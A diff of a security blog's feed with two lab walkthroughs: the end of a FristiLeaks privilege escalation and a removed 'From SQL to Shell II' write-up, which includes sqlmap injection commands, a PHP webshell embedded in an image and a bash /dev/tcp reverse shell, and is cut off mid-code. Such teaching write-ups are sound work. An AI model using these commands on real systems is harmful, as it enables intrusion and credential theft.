+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin         <span class="m">21</span> Nov <span class="m">18</span> 15:21 cryptedpass.txt
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">258</span> Nov <span class="m">18</span> 15:20 cryptpass.py
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">90544</span> Nov <span class="m">18</span> 13:49 df
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">24136</span> Nov <span class="m">18</span> 13:40 <span class="nb">echo</span>
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 egrep
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 grep
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">85304</span> Nov <span class="m">18</span> 13:41 ps
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod     <span class="m">25</span> Nov <span class="m">19</span> 01:47 whoisyourgodnow.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The file <code>cryptedpass.txt</code> contain crypted string <code>mVGZ3O3omkJLmy2pcuTq</code> and the file <code>cryptpass.py</code> seems a crypto program which the process is</p>
+
+<ul>
+<li>base64 encoded</li>
+<li>reverse the string</li>
+<li>encode the reversed string via rot13</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat cryptedpass.txt
+</span><span class='line'>mVGZ3O3omkJLmy2pcuTq
+</span><span class='line'>bash-4.1<span class="nv">$ </span>cat cryptpass.py
+</span><span class='line'>cat cryptpass.py
+</span><span class='line'><span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
+</span><span class='line'>import base64,codecs,sys
+</span><span class='line'>
+</span><span class='line'>def encodeString<span class="o">(</span>str<span class="o">)</span>:
+</span><span class='line'>    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
+</span><span class='line'>    <span class="k">return</span> codecs.encode<span class="o">(</span>base64string<span class="o">[</span>::-1<span class="o">]</span>, <span class="s1">&#39;rot13&#39;</span><span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">cryptoResult</span><span class="o">=</span>encodeString<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">])</span>
+</span><span class='line'>print cryptoResult
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>By using python, I decoded the secret string and got the plain text is <code>thisisalsopw123</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; import base64
+</span><span class='line'>&gt;&gt;&gt; <span class="nv">cryptedtxt</span><span class="o">=</span><span class="s1">&#39;mVGZ3O3omkJLmy2pcuTq&#39;</span>
+</span><span class='line'>&gt;&gt;&gt; base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)[</span>::-1<span class="o">]))</span>
+</span><span class='line'><span class="s1">&#39;thisisalsopw123&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The same method to crack the secret string in <code>whoisyourgodnow.txt</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; <span class="nv">cryptedtxt</span><span class="o">=</span><span class="s1">&#39;=RFn0AKnlMHMPIzpyuTI0ITG&#39;</span>
+</span><span class='line'>&gt;&gt;&gt; base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)[</span>::-1<span class="o">]))</span>
+</span><span class='line'><span class="s1">&#39;LetThereBeFristi!&#39;</span>
+</span><span class='line'>&gt;&gt;&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>My best guess is that <font color="red"><code>LetThereBeFristi!</code></font> is the password of the user <font color="red"><code>fristigod</code></font> &hellip; and &hellip; Yes! I am <code>fristigod</code> now!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>su fristigod
+</span><span class='line'>su fristigod
+</span><span class='line'>Password: LetThereBeFristi!
+</span><span class='line'>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
+</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /home
+</span><span class='line'><span class="nb">cd</span> /home
+</span><span class='line'>bash-4.1<span class="nv">$ </span>ls
+</span><span class='line'>ls
+</span><span class='line'>admin  eezeepz    fristigod
+</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd </span>fristigod
+</span><span class='line'><span class="nb">cd </span>fristigod
+</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 20
+</span><span class='line'>drwx------  <span class="m">2</span> fristigod fristigod <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
+</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod   <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod  <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod  <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
+</span><span class='line'>bash-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After enumeration, I found something interesting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!
+</span><span class='line'>
+</span><span class='line'>Matching Defaults entries <span class="k">for</span> fristigod on this host:
+</span><span class='line'>    requiretty, !visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS</span>
+</span><span class='line'><span class="s2">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1</span>
+</span><span class='line'><span class="s2">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE</span>
+</span><span class='line'><span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY</span>
+</span><span class='line'><span class="s2">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL</span>
+</span><span class='line'><span class="s2">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
+</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+</span><span class='line'>
+</span><span class='line'>User fristigod may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After checking the file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I know this binary is owned by <code>root</code> and the sticky bit has been set. It will allow people to run command as ROOT.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>ls -al /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">7529</span> Nov <span class="m">25</span> 05:53 /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>bash-4.1<span class="nv">$ </span>strings /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>strings /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>/lib64/ld-linux-x86-64.so.2
+</span><span class='line'>__gmon_start__
+</span><span class='line'>libc.so.6
+</span><span class='line'>setuid
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>strcat
+</span><span class='line'>stderr
+</span><span class='line'>system
+</span><span class='line'>getuid
+</span><span class='line'>fwrite
+</span><span class='line'>__libc_start_main
+</span><span class='line'>GLIBC_2.2.5
+</span><span class='line'>fff.
+</span><span class='line'>fffff.
+</span><span class='line'>l<span class="nv">$ </span>L
+</span><span class='line'>t<span class="k">$(</span>L
+</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
+</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="k">)</span>
+</span><span class='line'>Usage: ./program_name terminal_command ...
+</span><span class='line'>bash-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But when I run the binary file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I got wrong user error message :(`</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>/var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>/var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="o">)</span>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After further enumeration&hellip; I finally got clues in <code>/var/fristigod/.bash_history</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat .bash_history
+</span><span class='line'>cat .bash_history
+</span><span class='line'>ls
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>ls -lah
+</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
+</span><span class='line'>ls
+</span><span class='line'>./doCom
+</span><span class='line'>./doCom <span class="nb">test</span>
+</span><span class='line'>sudo ls
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
+</span><span class='line'>ls
+</span><span class='line'>./doCom
+</span><span class='line'>sudo -u fristi ./doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>groups
+</span><span class='line'>ls -lah
+</span><span class='line'>usermod -G fristigod fristi
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>less /var/log/secure e
+</span><span class='line'>Fexit
+</span><span class='line'><span class="nb">exit</span>
+</span><span class='line'><span class="nb">exit</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s go rooting now!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="s1">&#39;ls -al /root&#39;</span>
+</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!
+</span><span class='line'>
+</span><span class='line'>total 48
+</span><span class='line'>dr-xr-x---.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:09 .
+</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root root <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
+</span><span class='line'>-rw-------   <span class="m">1</span> root root <span class="m">1936</span> Nov <span class="m">25</span> 06:10 .bash_history
+</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">18</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_logout
+</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_profile
+</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> Sep <span class="m">22</span>  <span class="m">2004</span> .bashrc
+</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 05:53 .c
+</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">100</span> Sep <span class="m">22</span>  <span class="m">2004</span> .cshrc
+</span><span class='line'>-rw-------.  <span class="m">1</span> root root <span class="m">1291</span> Nov <span class="m">17</span> 06:51 .mysql_history
+</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">129</span> Dec  <span class="m">3</span>  <span class="m">2004</span> .tcshrc
+</span><span class='line'>-rw-------.  <span class="m">1</span> root root  <span class="m">829</span> Nov <span class="m">17</span> 09:17 .viminfo
+</span><span class='line'>-rw-------.  <span class="m">1</span> root root  <span class="m">246</span> Nov <span class="m">17</span> 12:19 fristileaks_secrets.txt
+</span><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="s1">&#39;cat /root/fristileaks_secrets.txt&#39;</span>
+</span><span class='line'>stileaks_secrets.txt<span class="s1">&#39;ristigod/.secret_admin_stuff/doCom &#39;</span>cat /root/fri
+</span><span class='line'>Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>I wonder <span class="k">if</span> you beat it in the maximum <span class="m">4</span> hours it<span class="err">&#39;</span>s supposed to take!
+</span><span class='line'>
+</span><span class='line'>Shoutout to people of <span class="c">#fristileaks (twitter) and #vulnhub (FreeNode)</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Done..</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] SickOs 1.1]]></title>
@@ -10343,183 +11633,6 @@ Due to there is no validation on parameter &ldquo;<strong><a href="http://php.ne
 <p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>
 
 <p>To be continued&hellip;</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[PentesterLab] From SQL to Shell II]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii/"/>
-    <updated>2015-05-12T06:33:13-04:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii</id>
-    <content type="html"><![CDATA[<p>This is an upgraded version from previous course &ldquo;<a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell'>From SQL Injection to Shell</a>&rdquo; which is talking about how to exploit basic error-based SQL injection vulnerability, in this course &ldquo;From SQL Injection to Shell II&rdquo;, more advanced techniques will be used to exploit complicated Blind-SQL injection vulnerability.</p>
-
-<p>More information and ISO download please check <a href='https://ptl.io/from_sqli_to_shell_II_i386.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>
-
-<p>Difficulty: 3 / 5</p>
-
-<!-- more -->
-
-
-
-
-<h2>Links</h2>
-
-
-<p>watch video online:</p>
-
-<iframe src='http://player.vimeo.com/video/127586134?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
-
-
-
-
-<h2>Method</h2>
-
-
-<ul style="list-style-type:disc">
-<li>Scanned the network to discover the target server [Net Discover]</li>
-<li>Port scanned the target to discover the running services and open ports [nmap]</li>
-<li>Interacted with the web server, found the it is Nginx server and also found admin login page. [Firefox]</li>
-<li>Use sqlmap to test and exploit the blind-SQL injection vulnerability which is happened in HTTP header "X-Forwarded-for". [sqlmap]</li>
-<li>In order to bypass the file validation to upload php webshell, the attacker use exiftool to store php code hidden in a real jpg image. [exiftool]</li>
-</ul>
-
-
-<h2>Tools</h2>
-
-
-<p>All the tools used here can be found in Kali Linux</p>
-
-<ul style="list-style-type:disc">
-<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
-<li><a href='https://nmap.org/'>Nmap</a></li>
-<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
-<li><a href='http://sqlmap.org/'>sqlmap</a></li>
-<li><a href='http://www.sno.phy.queensu.ca/~phil/exiftool/'>exiftool</a></li>
-</ul>
-
-
-<h2>Walkthrough</h2>
-
-
-<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>pdf</a>, we know that we need to find and exploit a blind SQL injection vulnerability to dump and crack the web admin&rsquo;s password. After login to the dashboard, we need to find a way to bypass file validation function and upload image with php webshell.</p>
-
-<h3>Detect and Exploit Blind SQL injection in HTTP header 'X-Forwarded-for'</h3>
-
-
-<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. When the web page has been loaded, my firefox addon &ldquo;<a href='https://wappalyzer.com/'>wappalyzer</a>&rdquo; show the web server is <a href='http://nginx.org/en/'>Nginx</a> (which has mis-configuration vulnerability will be used later to interpret image file as PHP). Also there is &ldquo;Admin&rdquo; link will access to admin dashboard login page.</p>
-
-<p>Next the attacker uses SQLMAP to detect and exploit the blind SQL injection.</p>
-
-<p>1st detect and fetch all the databases from the server.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --dbs</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/1.png"></p>
-
-<p>2nd fetch all the tables belong to database &ldquo;photoblog&rdquo;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --tables -D photoblog --smart --batch</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/2.png"></p>
-
-<p>3rd dump table &ldquo;user&rdquo;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --dump -T users -D photoblog --smart --batch</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/3.png"></p>
-
-<p>Here we can see that login username is &ldquo;<font color='red'>admin</font>&rdquo; and password is &ldquo;<font color='red'>P4ssw0rd</font>&rdquo;</p>
-
-<p>After login to the dashboard, there is file upload function (the URL is <a href="http://10.10.10.129/admin/new.php">http://10.10.10.129/admin/new.php</a>)</p>
-
-<p>After many times Trail and error, I found the only real image (.png, .jpg and .gif) with correct content can be uploaded, then the image file will be renamed and saved in &ldquo;/admin/uploads/&rdquo;.</p>
-
-<p>However, Nginx has a mis-configure vulnerability which can be exploited to make the shell executed.</p>
-
-<p>In order to test if the target server has the mis-configure vulnerability, I tried the following commands:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /admin/uploads/1431253877.jpg HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n" | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>
-
-
-<p>and</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /admin/uploads/1431253877.jpg/test.php HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n" | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/4.png"></p>
-
-<p>From the result above, we can see that the difference in the value of &ldquo;Content-Type&rdquo; between the two responses. the second response shows that the file has been interpreted as PHP code.</p>
-
-<p>Now I inject the classic single-line php shell (&lt;?php system($_GET[&lsquo;cmd&rsquo;]); ?>) into an image by using &ldquo;exiftool&rdquo;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool "-comment&lt;=shell.php" img.jpg</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Then I set up NC on my Kali Linux to listen on port 5555, after uploaded the file and exploit the Nginx mis-configure vulnerability, I got a shell back.</p>
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/5.png"></p>
-
-<p>Then I use the following command to get a better shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/bash -i >& /dev/tcp/10.10.10.131/4444 0>&1</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/6.png"></p>
-
-<p>Done.</p>
-
-<h3>Code Review</h3>
-
-
-<p>The vulnerable code is in the file stats.php</p>
-
-<figure class='code'><figcaption><span>stats.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>
